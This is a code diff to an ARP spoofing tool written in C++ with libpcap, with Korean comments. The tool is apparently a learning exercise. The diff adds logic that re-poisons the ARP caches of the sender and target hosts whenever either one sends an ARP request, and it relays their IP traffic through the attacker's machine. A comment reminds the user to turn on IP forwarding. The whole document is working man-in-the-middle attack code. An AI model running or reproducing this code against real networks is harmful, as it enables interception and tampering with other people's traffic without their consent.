@@ -90,15 +90,58 @@ void relayPacket(pcap_t* handle, const Mac& attackerMac, const u_char* raw, int 
     }
 }
 
+void handleArpRequest(pcap_t* handle, const Mac& attackerMac, const EthArpPacket* pkt) {
+    if (ntohs(pkt->arp_.op_) != ArpHdr::Request) return; // ARP Request가 아니면 무시
+
+    Ip sip(ntohl(pkt->arp_.sip_));
+    Ip tip(ntohl(pkt->arp_.tip_));
+
+    for (auto& s : sessions) {
+        // sender 또는 target이 ARP 요청 보냈는지 확인
+        if (sip == s.senderIp || sip == s.targetIp || tip == s.senderIp || tip == s.targetIp) {
+            poisonSession(handle, attackerMac, s); // 즉시 감염 재시도
+            printf("[!] Detected ARP Request - Re-poisoned %s <> %s\n",
+                   std::string(s.senderIp).c_str(), std::string(s.targetIp).c_str());
+        }
+    }
+}
+
+
 void relayLoop(pcap_t* handle, const Mac& attackerMac) {
     while (running) {
         pcap_pkthdr* hdr;
         const u_char* pkt;
         int res = pcap_next_ex(handle, &hdr, &pkt);
-        if (res <= 0) { if (res<0) break; else continue; }
+        if (res <= 0) {
+            if (res < 0) break;
+            else continue;
+        }
+
+        auto eth = reinterpret_cast<const EthHdr*>(pkt);
+
+        if (ntohs(eth->type_) == EthHdr::Arp) {
+            auto arp = reinterpret_cast<const EthArpPacket*>(pkt);
+            if (ntohs(arp->arp_.op_) == ArpHdr::Request) {
+                Ip sip(ntohl(arp->arp_.sip_));
+                Ip tip(ntohl(arp->arp_.tip_));
+                for (auto& s : sessions) {
+                    if (sip == s.senderIp || tip == s.senderIp ||
+                        sip == s.targetIp || tip == s.targetIp) {
+                        poisonSession(handle, attackerMac, s);
+                        printf("[!] ARP Request detected — Re-poisoned %s <> %s\n",
+                               std::string(s.senderIp).c_str(),
+                               std::string(s.targetIp).c_str());
+                    }
+                }
+            }
+            continue; // ARP 패킷은 릴레이하지 않음
+        }
+
+        // IP 패킷 릴레이
         relayPacket(handle, attackerMac, pkt, hdr->len);
     }
 }
+
 
 int main(int argc, char* argv[]) {
     if (argc < 4 || (argc % 2) != 0) {
@@ -137,6 +180,7 @@ int main(int argc, char* argv[]) {
                std::string(targetIp).c_str());
     }
 
+    // IP forwarding 켜는 것도 잊지 마세요:
     //   sudo sysctl -w net.ipv4.ip_forward=1
 
     std::thread t1(poisonLoop, handle, attackerMac);
